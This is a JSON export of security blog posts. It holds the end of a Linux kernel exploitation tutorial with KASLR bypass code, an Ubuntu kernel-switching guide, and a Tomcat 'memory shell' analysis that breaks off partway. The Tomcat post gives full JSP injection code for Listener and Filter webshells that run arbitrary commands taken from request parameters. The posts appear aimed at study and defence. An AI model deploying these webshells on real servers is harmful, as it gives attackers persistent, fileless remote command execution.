{\n\t\tperror(\"ioctl\");\n\t\texit(-1);\n\t}\n\n\tclose(fd);\n\n\treturn value;\n}\n\nunsigned long leak_stack() {\n\tstruct rwRequest req;\n\tunsigned long stack;\n\n\tint fd = Open(\"/dev/vuln\", O_RDONLY);\n\n\treq.uaddr = &amp;stack;\n\tif (ioctl(fd, VULN_STACK, &amp;req) &lt; 0) {\n\t\tperror(\"ioctl\");\n\t\texit(-1);\n\t}\n\n\tclose(fd);\n\n\treturn stack;\n}\n\nunsigned long leak_pgd() {\n\tstruct rwRequest req;\n\tunsigned long pgd = 0xcccccccc;\n\n\tint fd = Open(\"/dev/vuln\", O_RDONLY);\n\n\treq.uaddr = &amp;pgd;\n\tif (ioctl(fd, VULN_PGD, &amp;req) &lt; 0) {\n\t\tperror(\"ioctl\");\n\t\texit(-1);\n\t}\n\n\tclose(fd);\n\n\treturn pgd;\n}\n\nunsigned long leak_physmap_base() {\n\tstruct rwRequest req;\n\tunsigned long pgd = 0xcccccccc;\n\n\tint fd = Open(\"/dev/vuln\", O_RDONLY);\n\n\treq.uaddr = &amp;pgd;\n\tif (ioctl(fd, VULN_PB, &amp;req) &lt; 0) {\n\t\tperror(\"ioctl\");\n\t\texit(-1);\n\t}\n\n\tclose(fd);\n\n\treturn pgd;\n}\n\nint check_page(unsigned long addr) {\n\n\tunsigned long page[0x101];\n\n\tfor (int i = 0; i &lt; 0x101; i++) {\n\t\tpage[i] = read64(addr + i*8);\n\t}\n\tfor (int i = 0; i &lt; 0x100; i++) {\n\t\tif (((page[i] &amp; 0xff) != 0x67) || (!(page[i] &gt;&gt; 63))) {\n\t\t\treturn 0;\n\t\t}\n\t}\n\n\treturn page[0x100] == 0;\n}\n\nint main (int argc, char **argv){\n\n\tvoid *pg;\n\tunsigned long search_addr;\n\t\n\tsearch_addr = pageOffsetBase + (0x7c000 &lt;&lt; 12);\n\t\n\tfor (unsigned long i = 1; i &lt; 0x100; i++) {\n\t\tpg = mmap((void *)(i &lt;&lt; 39), 0x1000, PROT_READ|PROT_WRITE, MAP_POPULATE|MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);\n\t\tif (pg == MAP_FAILED) {\n\t\t\tperror(\"mmap\");\n\t\t\texit(-1);\n\t\t}\n\t}\n\n\tprintf(\"[*] starting search from addr %p\\n\", (void *)search_addr);\n\t\n\twhile(1) {\n\t\tif (check_page(search_addr)) {\n\t\t\tprintf(\"[+] located the PGD: %p\\n\", (void *)search_addr);\n\t\t\tbreak;\n\t\t}\n\t\tsearch_addr += 0x1000;\n\t}\n\n\tprintf(\"[*] this is the actual PGD: %p\\n\", (void *)leak_pgd());\n\t\n\treturn 0;\n}\n\n​        如此可以在用户空间通过大量的mmap，然后拿到其物理地址，然后通过内核态的地址转换将该物理地址转换为内核的虚拟地址通过kernel module进行读取就会发现内核可以读取到用户态的数据。\n​        如此就知道绕过的原理了，总结一下就是通过内核空间和用户空间确定相同的物理页然后让kernel进行代码执行。\nKASLR bypass​        KASLR其实就是内核态的地址随机化，类似用户态的做法，bypass可以通过确定基地址然后加上固定偏移来解决。但是观察/proc/kallsyms的内容发现一些符号其实是完全自己在随机，而不是拥有一个固定的偏移，这就引出了Linux Kernel的一个机制Function Granular KASLR，简单来说就是内核在加载的时候会以函数级别重新排布内核代码。\n​        但是FG-KASLR并不完善，一些内核区域并不会随机化：\n\n不幸，commit_creds 和 prepare_kernel_cred在FG-KASLR的区域。\nswapgs_restore_regs_and_return_to_usermode和__x86_retpoline_r15函数不受到FG-KASLR影响，这能帮助找到一些gadget。\n内核符号表ksymtab不受影响，这里存储了一些偏移可以用于计算prepare_kernel_cred和commit_creds的地址。\n\n​        第三个比较感兴趣：\nstruct kernel_symbol {\n\t  int value_offset;\n\t  int name_offset;\n\t  int namespace_offset;\n};\n\n可以看出value_offset应该是比较有趣的，这个对应的值也可以通过/proc/kallsyms获取：\n\n因此一般就可以在ROP中利用任意读读出相对应的偏移用于计算其它函数的具体位置。\n总结​        网上看到一段总结，感觉很不错：\n\n如果内核没有保护，就直接ret2usr。\n如果开了SMEP，就用ROP\n溢出或者位置被限制在栈上，就用pivot gadget进行栈迁移。\nKPTI利用KPTI trampoline或者signal handler\nSMAP会导致stack pivot很难利用\n如果没有KASLR，直接泄露地址就能用，开了的话就用基地址 + 偏移。\n如果有FG-KASLR，记得利用ksymtab和不受影响的区域。\n\n参考链接\n\n\n\n\n\n\n\n\nhttps://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/\nhttps://github.com/pr0cf5/kernel-exploit-practice\n","slug":"Linux Kernel 保护机制绕过","date":"2022-07-19T10:48:45.000Z","categories_index":"Linux Kernel","tags_index":"Linux Kernel","author_index":"RainSec"},{"id":"13f80bc1c75f3199fa7b182a57317bf0","title":"Ubuntu 更新内核到指定版本","content":"记一次更新内核到5.8.0-33-generic\n\n更新到指定版本查看当前版本$ uname -r\n4.15.0-101-generic\n\n$ lsb_release -a\nNo LSB modules are available.\nDistributor ID: Ubuntu\nDescription:    Ubuntu 20.04 LTS\nRelease:        20.04\nCodename:       focal\n\n查看当前已经安装的 Kernel Image$ dpkg --get-selections |grep linux-image\nlinux-image-5.4.0-90-generic                    purge\nlinux-image-5.8.0-33-generic                    install\nlinux-image-generic                             install\n\n查询当前软件仓库可以安装的 Kernel Image 版本，如果没有预期的版本，则需要额外配置仓库$ apt-cache search linux | grep linux-image\n\n安装指定版本的 Kernel Image 和 Kernel Header$ sudo apt-get install linux-headers-5.8.0-33-generic linux-image-5.8.0-33-generic\n\n查看当前的Kernel列表$ grep menuentry /boot/grub/grub.cfg\nif [ x\"${feature_menuentry_id}\" = xy ]; then\n  menuentry_id_option=\"--id\"\n  menuentry_id_option=\"\"\nexport menuentry_id_option\nmenuentry 'Ubuntu' --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option 'gnulinux-simple-b986dc3b-6b82-44d5-acb8-6cbad5e357d5' {\nsubmenu 'Advanced options for Ubuntu' $menuentry_id_option 'gnulinux-advanced-b986dc3b-6b82-44d5-acb8-6cbad5e357d5' {\n        menuentry 'Ubuntu, with Linux 5.8.0-33-generic' --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option 'gnulinux-5.8.0-33-generic-advanced-b986dc3b-6b82-44d5-acb8-6cbad5e357d5' {\n        menuentry 'Ubuntu, with Linux 5.8.0-33-generic (recovery mode)' --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option 'gnulinux-5.8.0-33-generic-recovery-b986dc3b-6b82-44d5-acb8-6cbad5e357d5' {\n        menuentry 'Ubuntu, with Linux 5.4.0-90-generic' --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option 'gnulinux-5.4.0-90-generic-advanced-b986dc3b-6b82-44d5-acb8-6cbad5e357d5' {\n        menuentry 'Ubuntu, with Linux 5.4.0-90-generic (recovery mode)' --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option 'gnulinux-5.4.0-90-generic-recovery-b986dc3b-6b82-44d5-acb8-6cbad5e357d5' {\n\n修改 Kernel 的启动顺序：如果安装的是最新的版本，那么默认就是首选的；如果安装的是旧版本，就需要修改 grub 配置$ sudo vim /etc/default/grub\n\n# GRUB_DEFAULT=0\nGRUB_DEFAULT=\"Advanced options for Ubuntu&gt;Ubuntu, with Linux 5.8.0-33-generic\"\n\n生效配置$ update-grub\n$ reboot\n\n删除不需要的Kernel查询不包括当前内核版本的其它所有内核版本$ dpkg -l | tail -n +6| grep -E 'linux-image-[0-9]+'| grep -Fv $(uname -r)\npi  linux-image-5.4.0-90-generic         5.4.0-90.101                      amd64        Signed kernel image generic\n\nKernel 状态：\n\nrc：表示已经被移除\nii：表示符合移除条件（可移除）\niU：已进入 apt 安装队列，但还未被安装（不可移除）\n\n删除指定的Kerneldpkg --purge linux-image-5.4.0-90-generic\n\n","slug":"Ubuntu20.04 升级降级内核到指定版本","date":"2022-03-28T10:38:45.000Z","categories_index":"系统运维","tags_index":"Linux","author_index":"RainSec"},{"id":"a5eb3b6436793531605058c41325d8af","title":"Tomcat内存马简析","content":"Tomcat内存马简析  webshell木马配合webshell管理工具可以方便对于服务器、内网进行进一步的维权、入侵，随着对文件内容查杀、以Ai对流量特征和行为模式的查杀等等手段，普通文件形式的webshell木马可靠性越来越差。也许好不容易绕过waf传上去两分钟不到就被杀掉了，所以攻击方在近些年也慢慢的研发出“无文件”的webshell木马，即内存马。内存马的概念提出比较久的，但走进视野就近几年的事情，每隔一段时间总能看到不少师傅提出新的内存马实现方法，这里简单说下利用JavaWeb的三大组件Servle、Filter、Listener来动态注册内存马的方式。\n前置知识  jsp带回显的webshell木马：\n&lt;% if(request.getParameter(\"shell\")!=null){\n    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"shell\")).getInputStream();\n    int a = -1;\n    byte[] b = new byte[2048];\n    out.print(\"&lt;pre&gt;\");\n    while((a=in.read(b))!=-1){\n        out.print(new String(b));\n    }\n    out.print(\"&lt;/pre&gt;\");\n}\n \n%&gt;\nrequest来获得用户请求，当shell字段的get请求存在时，将shell字段的请求信息当作cmd命令去执行，然后执行的结果通过getInputStream()输入流读返回结果，结果读进byte数组中，若有回显，则打印出结果。\n  然而现在的内存马则将重点放在注册恶意组件上，对于Tomcat主要通过JavaWeb的Servlet、Filter、Listener这三大组件来实现。简单说下他们的功能：\n  1、Servlet来处理客户端请求的动态资源，也就说我们用浏览器跳转后，请求由Servlet接受和处理，并完成响应，其中init方法在于接收客户端的第一次请求，service每次请求都会调用，destroy则是销毁用的。\n  2、Filter是拦截器，作用在于拦截请求路径，init在创建Filter对象是调用。doFilter在请求到来，被拦截时执行，destroy就是销毁此对象。\n  3、Listener是事件监听器，作用在于当某事件（比如点击等）在特定事件源发生时执行监听器代码，contextInitialized在Servletcontext创建时调用，contextDestroyed则在Servletcontext销毁时调用。\n  加载的顺序为Listener-&gt;Filter-&gt;Servlet。\n  在基于tomcat编写内存马时经常会遇到它的三个Context，及ServletContext、ApplicationContext、StandardContext，这里简单了解下：\n  首先是Servlet，浏览器发送请求，浏览器接受请求后对请求作出处理，而Tomcat作为一个Servlet容器，将请求传给Servlet，并将相应返回给浏览器，而ServletContext就是servlet要实现的接口，比如路径信息或者拦截信息等。\n  ApplicationContext的功能则在于实现ServletContext规范，一些对应方法的实现，例如addFilter等功能。\n  而在看StandardContext时会发现，ApplicationContext调用的context方法是StandardContext实现的对象，则StandardContext其实是底层与Tomcat底层交互的内容。\nListener内存马  既然加载顺序为Listener-&gt;Filter-&gt;Servlet，那么也根据这个顺序来调试。\n  在注册一个listener时因为要匹配不同的事件，常用的分为ServletContextListener、ServletContextAttributeListener、ServletRequestAttributeListener、HttpSessionListener、ServletRequestListener、HttpSessionAttributeListener，一般常用ServletRequestListener来作内存马，因为他可以监听我们任意访问的资源，在访问资源会触发后其requestInitialized方法。\n  ServletRequestListener的接口有两个事件处理方法：requestInitialized与requestDestroyed， requestInitialized(ServletRequestEvent sre)在与接受对应类型的参数，通过此参数来获得创建的对象；requestDestroyed(ServletRequestEvent sre)则是参数对象销毁时，调用此方法。知道这些就可以创建一个恶意Listener类：\n@WebListener\npublic class ListenerShell implements ServletRequestListener {\n    @Override\n    public void requestInitialized(ServletRequestEvent sre) {\n        HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();\n        String command = req.getParameter(\"cmd\");\n        if (command != null) {\n            try {\n                InputStream in = Runtime.getRuntime().exec(command).getInputStream();\n            } catch (IOException e) {\n                e.printStackTrace();\n            } catch (NullPointerException n) {\n                n.printStackTrace();\n            }\n        }\n    }\n    @Override\n    public void requestDestroyed(ServletRequestEvent sre) {\n    }\n}\n  其中HttpServletRequest代表浏览器请求，HTTP的所有信息都封装在此对象中，也就是可以从中得到请求信息，后面的就是请求读取请求命令和执行命令了。访问任意路由即可执行命令。接下来我们进行debug调试，从而知道他如何添加进去的。在我们添加的\npublic class ListenerShell implements ServletRequestListener {\n\n处下断点，查看调用栈：\n&lt;init&gt;:11, ListenerShell (com.Listener)\nnewInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)\nnewInstance:62, NativeConstructorAccessorImpl (sun.reflect)\nnewInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)\nnewInstance:423, Constructor (java.lang.reflect)\nnewInstance:150, DefaultInstanceManager (org.apache.catalina.core)\nlistenerStart:4691, StandardContext (org.apache.catalina.core)\n.....\n其中listenerStart我们跟进去看下\npublic boolean listenerStart() {\n    if (log.isDebugEnabled()) {\n        log.debug(\"Configuring application event listeners\");\n    }\n\n    String[] listeners = this.findApplicationListeners();\n    Object[] results = new Object[listeners.length];\n    boolean ok = true;\n\n    for(int i = 0; i &lt; results.length; ++i) {\n        if (this.getLogger().isDebugEnabled()) {\n            this.getLogger().debug(\" Configuring event listener class '\" + listeners[i] + \"'\");\n        }\n\n        try {\n            String listener = listeners[i];\n            results[i] = this.getInstanceManager().newInstance(listener);\n        }\n......\n其中findApplicationListeners方法就是将我们要注册的Listener传入该方法中，其中这里demo的值为com.Listener.ListenerShell，与写代码的文件目录一致。后面将对象信息传入results里，接下来对于类型进行分类\nif (lifecycleListener instanceof ServletContextAttributeListener || lifecycleListener instanceof ServletRequestAttributeListener || lifecycleListener instanceof ServletRequestListener || lifecycleListener instanceof HttpSessionIdListener || lifecycleListener instanceof HttpSessionAttributeListener) {\n    eventListeners.add(lifecycleListener);\n}\n因为这里实现的是ServletRequestListener，所以分到eventListeners数组中然后调用了getApplicationEventListeners\neventListeners.addAll(Arrays.asList(this.getApplicationEventListeners()));\nthis.setApplicationEventListeners(eventListeners.toArray());\npublic Object[] getApplicationEventListeners() {\n     return this.applicationEventListenersList.toArray();\n }\n其中返回的applicationEventListenersList，为已经注册的Listener，\npublic void setApplicationEventListeners(Object[] listeners) {\n    this.applicationEventListenersList.clear();\n    if (listeners != null &amp;&amp; listeners.length &gt; 0) {\n        this.applicationEventListenersList.addAll(Arrays.asList(listeners));\n    }\n\n}\nsetApplicationEventListeners主要完成applicationEventListenersList清空和重新赋值的操作，我们注册的Listener就存储在此。接下来我们去考虑Listener是如何触发的，此时我们在\npublic void requestInitialized(ServletRequestEvent sre) {\n下断点进行调试，并用浏览器访问路由，打开debug，在调用栈中看到\nrequestInitialized:14, ListenerShell (com.Listener)\nfireRequestInitEvent:5992, StandardContext (org.apache.catalina.core)\ninvoke:121, StandardHostValve (org.apache.catalina.core)\n......\n进入fireRequestInitEvent中：\npublic boolean fireRequestInitEvent(ServletRequest request) {\n    Object[] instances = this.getApplicationEventListeners();\n    if (instances != null &amp;&amp; instances.length &gt; 0) {\n        ServletRequestEvent event = new ServletRequestEvent(this.getServletContext(), request);\n        Object[] var4 = instances;\n        int var5 = instances.length;\n\n        for(int var6 = 0; var6 &lt; var5; ++var6) {\n            Object instance = var4[var6];\n            if (instance != null &amp;&amp; instance instanceof ServletRequestListener) {\n                ServletRequestListener listener = (ServletRequestListener)instance;\n\n                try {\n                    listener.requestInitialized(event);\n                } catch (Throwable var10) {\n                    ExceptionUtils.handleThrowable(var10);\n                    this.getLogger().error(sm.getString(\"standardContext.requestListener.requestInit\", new Object[]{instance.getClass().getName()}), var10);\n                    request.setAttribute(\"javax.servlet.error.exception\", var10);\n                    return false;\n                }\n            }\n        }\n    }\n\n    return true;\n}\n\n代码中获得Listener的方法也是调用了getApplicationEventListeners来获取，然后遍历数组，当是要调用的事件型监听器时，用listener.requestInitialized(event)将其触发。\n  现在知道Listener怎么存储了触发了，但我们还要知道如何添加Listener，这里说两种方案：\n  第一种，通过setApplicationEventListeners将Listener添加到数组中。\n  第二种，通过addApplicationEventListener方法来添加。\n  不管哪种方案，第一步肯定是获得StandardContext类，在上面的调用栈中可以看到调用了StandardHostValve的invoke方法，我们看下：\npublic final void invoke(Request request, Response response) throws IOException, ServletException {\n    Context context = request.getContext();\n那么我们也可以通过request来获取StandardContext。获取后我们就分别说下添加Listener的两种方案：\n  第一种，通过getApplicationEventListeners获取的StandardContext中的Listener数组，并将添加我们创建的listener进去，再setApplicationEventListeners数组即可：\n   Object[] objects = context.getApplicationEventListeners();\n   List&lt;Object&gt; listeners = Arrays.asList(objects);\n   List&lt;Object&gt; listenershelllist = new ArrayList(listeners);\nListenerShell listenershell = new ListenerShell;\n   listenershelllist.add(listenershell);\n   context.setApplicationEventListeners(listenershelllist.toArray());\n  第二种，StandardContext中有addApplicationEventListener方法，可以直接添加Listener：\nListenerShell listenershell = new ListenerShell;\n   context.addApplicationEventListener(listenershell);\n\n附上第一种的完整代码：\n&lt;%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %&gt;\n&lt;%@ page import=\"java.lang.reflect.Field\" %&gt;\n&lt;%@ page import=\"java.io.IOException\" %&gt;\n&lt;%@ page import=\"org.apache.catalina.core.StandardContext\" %&gt;\n&lt;%@ page import=\"org.apache.catalina.connector.Request\" %&gt;\n&lt;%@ page import=\"java.io.InputStream\" %&gt;\n&lt;%@ page import=\"java.util.List\" %&gt;\n&lt;%@ page import=\"java.util.Arrays\" %&gt;\n&lt;%@ page import=\"java.util.ArrayList\" %&gt;\n\n\n&lt;%\n    class ListenerMemShell implements ServletRequestListener {\n        @Override\n        public void requestInitialized(ServletRequestEvent sre) {\n            HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();\n            String command = req.getParameter(\"listenershell\");\n            if (command != null) {\n                try {\n                    InputStream in = Runtime.getRuntime().exec(command).getInputStream();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                } catch (NullPointerException n) {\n                    n.printStackTrace();\n                }\n            }\n        }\n        @Override\n        public void requestDestroyed(ServletRequestEvent sre) {\n        }\n    }\n%&gt;\n\n&lt;%\n    Field reqF = request.getClass().getDeclaredField(\"request\");\n    reqF.setAccessible(true);\n    Request req = (Request) reqF.get(request);\n    StandardContext context = (StandardContext) req.getContext();\n\n    Object[] objects = context.getApplicationEventListeners();\n    List&lt;Object&gt; listeners = Arrays.asList(objects);\n    List&lt;Object&gt; listenershelllist = new ArrayList(listeners);\n    ListenerMemShell listenershell = new ListenerMemShell();\n    listenershelllist.add(listenershell);\n    context.setApplicationEventListeners(listenershelllist.toArray());\n\n%&gt;\n访问jsp即注入成功后，任意路由?listenershell=command即可执行命令。\nFilter内存马  创建一个恶意Filter，恶意代码写再doFilter里：\npublic class FilterShell implements Filter {\n    @Override\n    public void init(FilterConfig filterConfig) throws ServletException {\n        System.out.println(\"filter初始化\");\n    }\n    @Override\n    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {\n        String command1 = request.getParameter(\"cmd1\");\n        if (command1 != null) {\n            try {\n                InputStream in = Runtime.getRuntime().exec(command1).getInputStream();\n            } catch (IOException e) {\n                e.printStackTrace();\n            } catch (NullPointerException n) {\n                n.printStackTrace();\n            }\n        }\n        chain.doFilter(request, response);\n    }\n    @Override\n    public void destroy() {\n\n    }\n\n}\n在web.xml里配置：\n&lt;filter&gt;\n    &lt;filter-name&gt;FilterShell&lt;/filter-name&gt;\n    &lt;filter-class&gt;com.Filter.FilterShell&lt;/filter-class&gt;\n&lt;/filter&gt;\n&lt;filter-mapping&gt;\n    &lt;filter-name&gt;FilterShell&lt;/filter-name&gt;\n    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;\n&lt;/filter-mapping&gt;\n&lt;/web-app&gt;\n在正式调试之前，有几个类需要简单知道一下：\nFilterDef 存储过滤器名filterName，过滤器实例filterClass，url 等基本信息\nFilterConfigs存储当前上下文信息StandardContext、FilterDef 和 Filter对象等信息\nFilterMaps 中主要存放了 FilterName 以及对应的URLPattern\nFilterChain：过滤器链，该对象上的 doFilter 方法能依次调用链上的 Filter\n我们在doFilter处下断点，访问路由，查看调用栈：\ndoFilter:15, FilterShell (com.Filter)\ninternalDoFilter:189, ApplicationFilterChain (org.apache.catalina.core)\ndoFilter:162, ApplicationFilterChain (org.apache.catalina.core)\ninvoke:197, StandardWrapperValve (org.apache.catalina.core)\ninvoke:97, StandardContextValve (org.apache.catalina.core)\ninvoke:541, AuthenticatorBase (org.apache.catalina.authenticator)\n......\n我们看下ApplicationFilterChain：\nprivate void internalDoFilter(ServletRequest request, ServletResponse response) throws IOException, ServletException {\n     if (this.pos &lt; this.n) {\n         ApplicationFilterConfig filterConfig = this.filters[this.pos++];\n\n         try {\n             Filter filter = filterConfig.getFilter();\n             if (request.isAsyncSupported() &amp;&amp; \"false\".equalsIgnoreCase(filterConfig.getFilterDef().getAsyncSupported())) {\n                 request.setAttribute(\"org.apache.catalina.ASYNC_SUPPORTED\", Boolean.FALSE);\n             }\n\n             if (Globals.IS_SECURITY_ENABLED) {\n                 Principal principal = ((HttpServletRequest)request).getUserPrincipal();\n                 Object[] args = new Object[]{request, response, this};\n                 SecurityUtil.doAsPrivilege(\"doFilter\", filter, classType, args, principal);\n             } else {\n                 filter.doFilter(request, response, this);\n             }\n\n         } catch (ServletException | RuntimeException | IOException var15) {\n             throw var15;\n         } catch (Throwable var16) {\n             Throwable e = ExceptionUtils.unwrapInvocationTargetException(var16);\n             ExceptionUtils.handleThrowable(e);\n             throw new ServletException(sm.getString(\"filterChain.filter\"), e);\n         }\n     } else {\n         try {\n             if (ApplicationDispatcher.WRAP_SAME_OBJECT) {\n                 lastServicedRequest.set(request);\n                 lastServicedResponse.set(response);\n             }\n\n             if (request.isAsyncSupported() &amp;&amp; !this.servletSupportsAsync) {\n                 request.setAttribute(\"org.apache.catalina.ASYNC_SUPPORTED\", Boolean.FALSE);\n             }\n\n             if (request instanceof HttpServletRequest &amp;&amp; response instanceof HttpServletResponse &amp;&amp; Globals.IS_SECURITY_ENABLED) {\n                 Principal principal = ((HttpServletRequest)request).getUserPrincipal();\n                 Object[] args = new Object[]{request, response};\n                 SecurityUtil.doAsPrivilege(\"service\", this.servlet, classTypeUsedInService, args, principal);\n             } else {\n                 this.servlet.service(request, response);\n             }\n         } catch (ServletException | RuntimeException | IOException var17) {\n             throw var17;\n         } catch (Throwable var18) {\n             Throwable e = ExceptionUtils.unwrapInvocationTargetException(var18);\n             ExceptionUtils.handleThrowable(e);\n             throw new ServletException(sm.getString(\"filterChain.servlet\"), e);\n         } finally {\n             if (ApplicationDispatcher.WRAP_SAME_OBJECT) {\n                 lastServicedRequest.set((Object)null);\n                 lastServicedResponse.set((Object)null);\n             }\n\n         }\n\n     }\n }\n\n我们可以看到通过filter.doFilter(request, response, this);来调用了doFilter，然后再向前看如何获得fiter：Filter filter = filterConfig.getFilter(); 前面已经简单说过了filterConfigs是什么了，一个filterConfig是一个ApplicationFilterConfig的实现类，在ApplicationFilterChain中：\nprivate ApplicationFilterConfig[] filters = new ApplicationFilterConfig[0];\n是将值传入，那么需要知道在哪初始化ApplicationFilterChain；在StandardWrapperValve#invoke中：\nApplicationFilterChain filterChain = ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);\n\n跟进createFilterChain，需要关注StandardContext、filterChain、FilterMaps、FilterConfig这些的操作。代码通过\nStandardContext context = (StandardContext)wrapper.getParent();\n来获取当前的StandardContext，并通过\nFilterMap[] filterMaps = context.findFilterMaps();\n来获得filterMap，通过filter名字得到对应的filterConfig：\nfilterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMap.getFilterName());\n最后通过\nfilterChain.addFilter(filterConfig);\n加入到filterChain中，，思路比较清晰，只要知道如何将我们想要的Filter信息添加到filterConfigs中，就可以添加到filterChain，从而触发。直接看debug信息可能直观一点：跟刚开始介绍的一样，filterDef需要对应的filter、filterName、FilterClass；filterMaps则需要filterName、urlPattern、dispatcherMapping。还有一点是获得StandardContext，有许多资源可以加以利用，方法很多，简单写两种大佬的demo：\n//获取ApplicationContextFacade类\nServletContext servletContext = request.getSession().getServletContext();\n \n//反射获取ApplicationContextFacade类属性context为ApplicationContext类\nField appContextField = servletContext.getClass().getDeclaredField(\"context\");\nappContextField.setAccessible(true);\nApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);\n \n//反射获取ApplicationContext类属性context为StandardContext类\nField standardContextField = applicationContext.getClass().getDeclaredField(\"context\");\nstandardContextField.setAccessible(true);\nStandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);\n或者\n//获取servletContext\nServletContext servletContext = request.getSession().getServletContext();\nApplicationContextFacade applicationContextFacade = (ApplicationContextFacade) servletContext;\nField applicationContextFacadeContext = applicationContextFacade.getClass().getDeclaredField(\"context\");\napplicationContextFacadeContext.setAccessible(true);\n//获取applicationContext\nApplicationContext applicationContext = (ApplicationContext) applicationContextFacadeContext.get(applicationContextFacade);\nField applicationContextContext = applicationContext.getClass().getDeclaredField(\"context\");\napplicationContextContext.setAccessible(true);\n//获取standardContext\nStandardContext standardContext = (StandardContext) applicationContextContext.get(applicationContext);\n然后就是注入jsp的代码了：\n&lt;%@ page import=\"java.io.IOException\" %&gt;\n&lt;%@ page import=\"java.lang.reflect.Field\" %&gt;\n&lt;%@ page import=\"org.apache.catalina.core.ApplicationContext\" %&gt;\n&lt;%@ page import=\"org.apache.catalina.core.StandardContext\" %&gt;\n&lt;%@ page import=\"org.apache.tomcat.util.descriptor.web.FilterDef\" %&gt;\n&lt;%@ page import=\"org.apache.tomcat.util.descriptor.web.FilterMap\" %&gt;\n&lt;%@ page import=\"java.lang.reflect.Constructor\" %&gt;\n&lt;%@ page import=\"org.apache.catalina.core.ApplicationFilterConfig\" %&gt;\n&lt;%@ page import=\"org.apache.catalina.Context\" %&gt;\n&lt;%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %&gt;\n&lt;%@ page import=\"org.apache.catalina.connector.Request\" %&gt;\n&lt;%@ page import=\"org.apache.catalina.core.ApplicationContextFacade\" %&gt;\n&lt;%@ page import=\"java.util.HashMap\" %&gt;\n\n\n&lt;%\n\n    class FIlterShell implements Filter {\n\n        public void init(FilterConfig filterConfig) throws ServletException {\n            System.out.println(\"filter初始化\");\n        }\n\n    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {\n        String FilterShell = request.getParameter(\"FilterShell\");\n        if (FilterShell != null) {\n            try {\n                Runtime.getRuntime().exec(FilterShell);\n            } catch (IOException e) {\n                e.printStackTrace();\n            } catch (NullPointerException n) {\n                n.printStackTrace();\n            }\n        }\n        chain.doFilter(request, response);\n    }\n        public void destroy() {\n\n        }\n\n\n\n}\n    ServletContext servletContext = request.getServletContext();\n    ApplicationContextFacade applicationContextFacade = (ApplicationContextFacade) servletContext;\n    Field applicationContextFacadeContext = applicationContextFacade.getClass().getDeclaredField(\"context\");\n    applicationContextFacadeContext.setAccessible(true);\n    ApplicationContext applicationContext = (ApplicationContext) applicationContextFacadeContext.get(applicationContextFacade);\n    Field applicationContextContext = applicationContext.getClass().getDeclaredField(\"context\");\n    applicationContextContext.setAccessible(true);\n    StandardContext standardContext = (StandardContext) applicationContextContext.get(applicationContext);\n\n    FIlterShell filter = new FIlterShell();\n    String FiterName = \"FilterMemShell\";\n    FilterDef filterDef = new FilterDef();\n    filterDef.setFilter(filter);\n    filterDef.setFilterName(FiterName);\n    filterDef.setFilterClass(filter.getClass().getName());\n    standardContext.addFilterDef(filterDef);\n\n\n    FilterMap filterMap = new FilterMap();\n    filterMap.addURLPattern(\"/*\");\n    filterMap.setFilterName(FiterName);\n    filterMap.setDispatcher(DispatcherType.REQUEST.name());\n    standardContext.addFilterMapBefore(filterMap);\n\n\n    Field Config = standardContext.getClass().getDeclaredField(\"filterConfigs\");\n    Config.setAccessible(true);\n    HashMap filterConfigs = (HashMap) Config.get(standardContext);\n\n\n\n    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);\n    constructor.setAccessible(true);\n    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);\n    filterConfigs.put(FiterName, filterConfig);\n%&gt;\n\n  不管获得StandardContext还是添加filterConfigs其实都有不少的代码实现，但思路大概差不太多，这里只是写一种方法。\nServlet内存马  在开始时看到有师傅用两个接口来实现内存马，分别是Servlet和HttpServlet，HttpServlet在Servlet的基础上添加了HTTP协议的处理方法，不在直接使用Servlet的service方法，而是对于Http的不同请求，分别调用doGet和doPost方法。虽然接口不同，但调用到底层差不多，这里选择实现HttpServlet来分析。编写Servlet恶意类：\npublic class ServletShell extends HttpServlet{\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        String command2 = req.getParameter(\"cmd2\");\n        if (command2 != null) {\n            try {\n                InputStream in = Runtime.getRuntime().exec(command2).getInputStream();\n            } catch (IOException e) {\n                e.printStackTrace();\n            } catch (NullPointerException n) {\n                n.printStackTrace();\n            }\n        }\n    }\n\n\n    @Override\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        doGet(req, resp);\n    }\n\n}\n\n在web.xml注册：\n&lt;servlet&gt;\n    &lt;servlet-name&gt;ServletShell&lt;/servlet-name&gt;\n    &lt;servlet-class&gt;com.Servlet.ServletShell&lt;/servlet-class&gt;\n&lt;/servlet&gt;\n&lt;servlet-mapping&gt;\n    &lt;servlet-name&gt;ServletShell&lt;/servlet-name&gt;\n    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;\n&lt;/servlet-mapping&gt;\n这次在ContextConfig#webconfig打断点，此方法的主要作用在于读取web.xml以及其他配置操作，可以较为形象的跟踪servlet的读取过程。查看调用栈：\nwebConfig:1264, ContextConfig (org.apache.catalina.startup)\nconfigureStart:986, ContextConfig (org.apache.catalina.startup)\nlifecycleEvent:303, ContextConfig (org.apache.catalina.startup)\nfireLifecycleEvent:123, LifecycleBase (org.apache.catalina.util)\nstartInternal:5135, StandardContext (org.apache.catalina.core)\nstart:183, LifecycleBase 